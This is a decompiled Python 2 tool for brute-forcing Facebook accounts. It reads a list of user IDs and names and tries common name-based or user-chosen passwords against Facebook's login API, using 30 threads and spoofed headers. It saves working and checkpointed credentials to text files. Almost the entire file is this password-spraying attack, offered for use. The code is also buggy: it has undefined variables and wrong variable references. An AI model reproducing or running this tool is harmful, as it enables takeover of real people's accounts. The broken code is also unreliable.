# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')

agents = [
 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 Instagram 153.0.0.34.96 Android (28/9; 480dpi; 1080x1920; HMD Global/Nokia; TA-1021; PLE; qcom; ru_RU; 236572377Mozilla/5.0 (Linux; Android 5.1; VIVO Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 9; Nokia 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = '\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;97m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mRishu Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[94mhttps://www.facebook.com/Rishu.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------n/'

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;32mPLEASE FOLLOW ME ON FACEBOOK TO CONTINUE\x1b[0;97m'
    os.system('xdg-open https://www.facebook.com/https://www.facebook.com/mrpardesi1')
    time.sleep(5)
    os.system('clear')
    print logo
    os.system('echo -e "  ENJOY THIS TOOL WITHOUT LOGIN : NO NEED TOKEN"| lolcat')
    print '\x1b[1;37m--------------------------------------------------'
    print '\x1b[1;91m[1]  \x1b[1;92mAUTO PASS FILE CLONING'
    print '\x1b[1;91m[2]  \x1b[1;96 2mCHOICE PASS FILE CLONING'
    print '\x1b[1;91m[3]  \x1b[1;92mCREATE FILE \x1b[1;97m(\x1b[1;93mEXTRACT\x1b[1;97m)'
    print '\x1b[1;91m[4]  \x1b[1;96 2mCONTACT WITH OWNER \x1b[1;97m(\x1b[1;92mRishu\x1b[1;97m)'
    print '\x1b[1;37m--------------------------------------------------'
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;93mCHOOSE \x1b[1;91m: \x1b[1;90m')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '4':
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
        menu()
    elif select == '3':
        os.system('python2 extract.py')
        menu()
    else:
        print '\tSelect valid option'
        menu_option()


def crack():
    os.system('clear')
    print logo
    print '\t    \x1b[1;36mAUTO PASS FILE CLONING\x1b[0;97m'
    print '\x1b[1;37m--------------------------------------------------'
    print '\x1b[1;91m[1] \x1b[1;36 2mAUTO PASS CRACK FILE'
    print '\x1b[1;91m[0] \x1b[1;92mBACK'
    print '\x1b[1;37m--------------------------------------------------'
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;93mCHOOSE \x1b[1;91m: \x1b[1;90m')
    id = []
    oks = []
    cps = []
    if select == '0':
        menu()
    elif select == '1':
        os.system('clear')
        print logo
        print '\t    \x1b[1;32mAUTO PASS FILE CLONING\x1b[0;97m'
        print '\x1b[1;37m--------------------------------------------------'
        try:
            idlist = raw_input('\x1b[1;97m[+] \x1b[1;92mFile Name \x1b[1;92m: \x1b[1;90m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    else:
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        crack_select()
    print '\x1b[1;37m--------------------------------------------------'
    print ' \x1b[1;92m Total IDs \x1b[1;91m: \x1b[1;96m' + str(len(id))
    print ' \x1b[1;93m The Process has started'
    print ' \x1b[1;96m Press ctrl + z to stop'
    os.system('echo -e "--------------------------------------------------"| lolcat')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name_lower + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mRISHU-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass1 + '\x1b[1;97m | \x1b[1;96m' + name
                ok = open('adiok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass1 + '\x1b[1;97m | \x1b[1;91m' + name
                cp = open('adicp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name_lower + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass2 + '\x1b[1;97m | \x1b[1;96m' + name
                    ok = open('adiok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass2 + '\x1b[1;97m | \x1b[1;91m' + name
                    cp = open('adicp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name_lower + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass3 + '\x1b[1;97m | \x1b[1;96m' + name
                        ok = open('adiok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass3 + '\x1b[1;97m | \x1b[1;91m' + name
                        cp = open('adicp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name_lower + '786'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass4 + '\x1b[1;97m | \x1b[1;96m' + name
                            ok = open('adiok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass4 + '\x1b[1;97m | \x1b[1;91m' + name
                            cp = open('adicp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = name_lower() + '1122'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass5 + '\x1b[1;97m | \x1b[1;96m' + name
                                ok = open('adiok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass5 + '\x1b[1;97m | \x1b[1;91m' + name
                                cp = open('adicp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;37m--------------------------------------------------'
    print '\x1b[1;92mThe process has been completed'
    print '\x1b[1;97mTotal \x1b[1;93mOk/Cp \x1b[1;91m: \x1b[1;96m' + str(len(oks)) + '/' + str(len(cps))
    print '\x1b[1;37m--------------------------------------------------'
    raw_input(' Press enter to back ')
    menu()


def choice():
    os.system('clear')
    print logo
    print '\t    \x1b[1;36mCHOICE PASS CRACK MENU\x1b[0;97m'
    print '\x1b[1;37m--------------------------------------------------'
    print '\x1b[1;97m[1]  \x1b[1;96mCHOICE PASS CRACK PUBLIC ID'
    print '\x1b[1;97m[2]  \x1b[1;96mCHOICE PASS CRACK FOLLOWERS'
    print '\x1b[1;97m[3]  \x1b[1;96mCHOICE PASS CRACK FILE'
    print '\x1b[1;97m[0]  \x1b[1;91mBACK'
    print '\x1b[1;37m--------------------------------------------------'
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;97mCHOOSE AN OPTION \x1b[1;91m: \x1b[1;93m')
    id = []
    oks = []
    cps = []
    if select == '0':
        menu()
    elif select == '1':
        os.system('clear')
        print logo
        print '\t    \x1b[1;36mCHOICE PASS FILE CLONING\x1b[0;97m'
        print '\x1b[1;37m--------------------------------------------------'
        print '\x1b[1;93m For example:223344,12345,786786\x1b[1;91m'
        print '\x1b[1;37m--------------------------------------------------'
        pass1 = raw_input('\x1b[1;93mPassword \x1b[1;91m: \x1b[1;93m')
        pass2 = raw_input('\x1b[1;93mPassword \x1b[1;91m: \x1b[1;93m')
        pass3 = raw_input('\x1b[1;93mPassword \x1b[1;91m: \x1b[1;93m')
        os.system('echo -e "--------------------------------------------------"| lolcat')
        try:
            idlist = raw_input('\x1b[1;97m[+] \x1b[1;92mFile Name \x1b[1;91m: \x1b[1;93m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            choice()

    else:
        print '\tSelect valid option\x1b[0;97m'
        choice_select()
    print '\x1b[1;37m--------------------------------------------------'
    print ' \x1b[1;92m Total IDs \x1b[1;91m: \x1b[1;96m' + str(len(id))
    print ' \x1b[1;93m The Process has started'
    print ' \x1b[1;96m Press ctrl + z to stop'
    print '\x1b[1;37m--------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass5 + '\x1b[1;97m | \x1b[1;96m' + name
                ok = open('adiok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass1 + '\x1b[1;97m | \x1b[1;91m' + name
                cp = open('adicp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass5 + '\x1b[1;97m | \x1b[1;96m' + name
                    ok = open('adiok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass2 + '\x1b[1;97m | \x1b[1;91m' + name
                    cp = open('adicp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mAdi-OK\x1b[1;97m]\x1b[1;92m ' + uid + '\x1b[1;97m | \x1b[1;92m' + pass5 + '\x1b[1;97m | \x1b[1;96m' + name
                        ok = open('adiok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mAdi-CP\x1b[1;97m]\x1b[1;90m ' + uid + '\x1b[1;97m | \x1b[1;90m' + pass3 + '\x1b[1;97m | \x1b[1;91m' + name
                        cp = open('adicp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;37m--------------------------------------------------'
    print '\x1b[1;92mThe process has been completed'
    print '\x1b[1;97mTotal \x1b[1;93mOk/Cp \x1b[1;91m: \x1b[1;96m' + str(len(oks)) + '/' + str(len(cps))
    print '\x1b[1;37m--------------------------------------------------'
    raw_input(' Press enter to back ')
    main()


if __name__ == '__main__':
    menu()
